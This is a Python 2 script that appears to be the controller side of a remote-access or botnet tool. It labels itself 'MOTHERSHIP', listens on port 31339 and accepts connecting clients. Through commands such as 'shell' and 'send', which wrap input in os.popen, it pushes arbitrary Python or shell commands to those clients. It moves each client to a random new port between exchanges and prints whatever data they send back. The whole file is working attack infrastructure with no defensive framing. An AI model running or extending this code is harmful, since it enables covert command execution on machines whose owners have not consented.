#!/usr/bin/env python

import select
import socket
import sys
import threading
import random
import time
import copy
import json

staticport = 31339
thread_count = 0

class Server:
    def __init__(self):
        self.porttimeout = 5
        self.backlog = 5
        self.size = 1024
        self.server = None
        self.rollingthreads = []

    def open_socket(self):
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.bind(('',staticport))
            self.server.listen(5)
        except socket.error, (value,message):
            if self.server:
                self.server.close()
            sys.exit(1)

    def run(self):
        sys.stdout.write("> ")
        self.open_socket()
        self.input = [self.server,sys.stdin]
        commands = {"shell": self.shell, "sleep": self.sleep, "status": self.status, "porttimeout": self.changePortTimeout, "send": self.sendPython, "quit": self.exit}
        running = 1
        while running:
            inputready,outputready,exceptready = select.select(self.input,[],[],1)
            for s in inputready:
                if s == self.server:
                    # handle the server socket
                    c = RollingClient(self.server.accept(), self)
                    c.start()
                    self.rollingthreads.append(c)

                elif s == sys.stdin:
                    # handle standard input
                    keyboard = sys.stdin.readline()
                    res = keyboard.split()
                    if len(res) > 0:
                        if res[0] in commands:
                            commands[res[0]](*res[1:])
                    sys.stdout.write("> ")

        # close all threads
        self.server.close()

        for c in self.rollingthreads:
            c.join()

    def sleep(self, *args):
        tid = int(args[0])

        thread = False
        for i in self.rollingthreads:
            if i.thread_id == tid:
                thread = i
                break
        if not thread:
            return

        thread.sleep(int(args[1]))
        print "Changed client's sleep time to", args[1]

    def sendPython(self, *args):
        tid = int(args[0])

        py = ""

        if (args[1] == "-f"):
            f = open(args[2], "r")
            py = f.read()
            f.close()
        else:
            py = " ".join(args[1:])
            
        thread = False
        for i in self.rollingthreads:
            if i.thread_id == tid:
                thread = i
                break
        if not thread:
            return
        print "Sending commands to thread", thread.thread_id
        thread.sendPython(py)

    def shell(self, *args):
        py = " ".join(args[1:])
        py = "import os; print os.popen(\"" + py.replace('"', '\\"') + "\").read();"
        self.sendPython(*[args[0], py])

    def changePortTimeout(self, timeout):
        self.porttimeout = int(timeout)

    def status(self):
        print "---MOTHERSHIP STATUS---"
        print "Static Port: {0}".format(staticport)    
        print "\n---CLIENTS---"
        for i in self.rollingthreads:
            print "Thread ID:", i.thread_id, "[", i.address, "]"

    def exit(self):
        for i in self.rollingthreads:
            i.client.close()
            i.join()
        exit()

    def kill(self, thread_id):
        for i in range(len(self.rollingthreads)):
            if self.rollingthreads[i].thread_id == thread_id:
                del self.rollingthreads[i]
                return

class RollingClient(threading.Thread):
    def __init__(self,(client,address), ser):
        global thread_count
        self.server = ser
        threading.Thread.__init__(self)
        self.client = client
        self.address = address
        self.size = 1024
        self.timeout = 15
        self.newport = -1
        self.thread_id = thread_count
        thread_count += 1
        self.nextPy = False
        self.sleep_time = 3
        self.last_sleep = 3

    def sendPython(self, py):
        self.nextPy = py
        
    def roll(self):
        try:
            self.newport = random.randint(10000,30000)
            data = {"code": self.nextPy, "newport": self.newport}

            if (self.last_sleep != self.sleep_time):
                self.last_sleep = self.sleep_time
                data["sleep"] = self.sleep_time

            self.nextPy = False
            self.client.send(json.dumps(data) + chr(255))
            self.client.close()
            self.newsock = socket.socket()
            #self.newsock.settimeout(self.sleep_time)
            self.newsock.bind(('',self.newport))
            self.newsock.listen(self.sleep_time)
        except Exception as e:
            #print self.name + ": "+str(e)
            pass

    def sleep(self, amt):
        self.sleep_time = amt

    def readuntil(self, s):
        b = ""
        while chr(255) not in b:
            b += s.recv(1)
        return b

    def exit(self):
        self.server.kill(self.thread_id)

    def run(self):
        running = 1
        while(1):
            self.roll()

            try:
                self.client, self.address = self.newsock.accept()

                res = self.readuntil(self.client)
                res = json.loads(res[:-1])
                if "data" in res and len(res["data"]) > 0:
                    print "Received data from {0} [Thread {1}]".format(self.address, self.thread_id)
                    print "->", res["data"][:-1]
                if "tid" in res and int(res["tid"]) != -1 and int(res["tid"]) != self.thread_id:
                   self.thread_id = res["tid"]
            except Exception as e:
                print e
                self.exit()
                return
            time.sleep(0.001)
            

if __name__ == "__main__":
    s = Server()
    s.run() 
